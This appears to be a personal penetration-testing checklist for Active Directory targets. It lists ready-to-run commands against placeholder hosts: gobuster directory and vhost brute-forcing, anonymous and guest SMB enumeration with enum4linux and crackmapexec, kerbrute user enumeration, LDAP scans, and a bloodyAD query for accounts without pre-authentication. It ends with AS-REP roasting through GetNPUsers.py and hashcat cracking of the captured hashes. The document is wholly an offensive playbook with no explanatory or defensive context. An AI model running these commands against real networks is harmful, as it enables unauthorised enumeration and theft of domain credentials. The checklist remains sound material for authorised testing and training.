# Sites
- [WADComs](https://wadcoms.github.io/) Windows/Active Directory cheat sheet and checklist.
- [AD Username Generator](https://github.com/w0Tx/generate-ad-username)

# Commands
- [ ] Nmap
- [ ] gobuster dir --url http://domain.com/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o gobuster.dir
- [ ] gobuster vhost --append-domain -u http://domain.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster.vhosts
- [ ] enum4linux -a -A $IP
- [ ] enum4linux -a -u "" -p "" $IP
- [ ] enum4linux -a -u "guest" -p "" $IP
- [ ] crackmapexec smb $IP --users --groups --shares
- [ ] crackmapexec smb $IP -u '' -p '' --users --groups --shares # Guest User
- [ ] crackmapexec smb $IP -u 'username' -p 'password' --users --groups --shares # Guest User
- [ ] kerbrute userenum -d domain.com -o kerbrute --dc dco1.domain.com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
- [ ] nmap -n -sV --script "ldap* and not brute" -p 389 $IP
- [ ] bloodyAD -u 'user' -p 'password' -d domain.com --host $IP get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
- [ ] GetNPUsers.py domain.com/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
- [ ] python GetNPUsers.py domain.com/username:password -request -format hashcat -outputfile hashes.asreproast
- [ ] hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
